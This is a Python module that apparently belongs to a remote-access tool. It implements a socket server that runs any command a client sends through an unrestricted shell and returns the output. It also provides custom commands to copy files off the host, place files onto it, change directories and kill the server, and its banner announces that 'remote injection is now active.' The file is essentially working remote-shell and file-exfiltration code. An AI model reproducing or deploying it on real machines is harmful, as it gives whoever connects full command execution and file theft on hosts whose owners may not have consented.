import os
import io
import sspicon
import subprocess
from PIL import Image
from lash.Exportables.fileTools import *


def port_verify(port):
    try:
        port = int(port)
        return port
    except ValueError:
        print(f'Invalid port [{port}], the value needs be a integer number like 4254 or 8234')
        quit(1)


def injection_client_msg():
    return \
        f'''
Connected successfully, remote injection is now active
You need to use the custom commands instead the system defaults
    
{"-" * 24}   Custom commands   {"-" * 24}
[-chdir path]          Change the the remote directory
[-kill]                Kill server all, connections lost
[-copy path_host]      Copy a file from host to your machine
[-move path_local]     Move a file from your machine to host
Move/Copy, gonna affect the local directory (host or client) 
        '''


def custom_server_manager(conn, buffer, path, command, command_arg1):
    os.chdir(path)
    if command_arg1 == '-chdir':
        try:
            path = command.split()[1]
        except IndexError:
            pass
        try:
            os.chdir(path)
        except FileNotFoundError:
            pass
        return True
    elif command_arg1 == '-copy':
        file_name = ''.join(command[len(command_arg1):]).strip()
        try:
            with open(file_name, 'rb') as file:
                content = file.read()
                conn.sendall(content)
        except FileNotFoundError:
                content = '404File not found'
                conn.send(bytes(content, 'utf-8'))
        return True
    elif command_arg1 == '-move':
        file_name = conn.recv(buffer).decode('utf-8')
        file_data = conn.recv(buffer)
        with open(file_name, 'wb') as file:
            file.write(file_data)
        msg = f'File: {file_name} has been copied to {os.getcwd()}'
        conn.send(bytes(msg, 'utf-8'))
        return True
    elif command == '-kill':
        os.system('cls')
        quit(0)
    elif command == '-getpath':
        conn.send(bytes(os.getcwd(), 'utf-8'))
        return True
    else:
        return False


def custom_client_manager(s, buffer, path, command, command_arg1):
    if command_arg1 == '-chdir':
        s.sendall(bytes(command, 'utf-8'))
        return True
    elif command_arg1 == '-copy':
        s.sendall(bytes(command, 'utf-8'))
        file_name = ''.join(command[len(command_arg1):]).strip()
        file_data = s.recv(buffer)
        if file_data.decode('utf-8') == '404File not found':
            print(f' ~ File \'{file_name}\' not found')
            return True
        with open(file_name, 'wb') as file:
            file.write(file_data)
        print(f'{file_name} has been copied to {os.getcwd()}')
        return True
    elif command_arg1 == '-move':
        s.sendall(bytes(command, 'utf-8'))
        file_name = ''.join(command[len(command_arg1):]).strip()
        with open(file_name, 'rb') as file:
            content = file.read()
        s.send(bytes(file_name, 'utf-8'))
        s.send(content)
        msg = s.recv(buffer).decode('utf-8')
        print(msg)
        return True
    elif command_arg1 == '-kill':
        s.sendall(bytes(command, 'utf-8'))
        quit(0)
    else:
        return False


def handle_connection(conn, buffer):
    while True:
        actual_path = os.getcwd()
        conn.send(bytes(actual_path, 'utf-8'))
        try:
            command = conn.recv(buffer).decode('utf-8').strip()
        except ConnectionResetError:
            continue
        try:
            command_arg1 = command.strip().split()[0]
        except IndexError:
            command_arg1 = command
        if not custom_server_manager(conn, buffer, os.getcwd(), command, command_arg1):
            output = subprocess.run(command, shell=True, capture_output=True, text=True).__dict__
            if len(output['stdout']) == 0:
                conn.send(bytes('command not found', 'utf-8'))
            else:
                conn.send(bytes(output['stdout'], 'utf-8'))
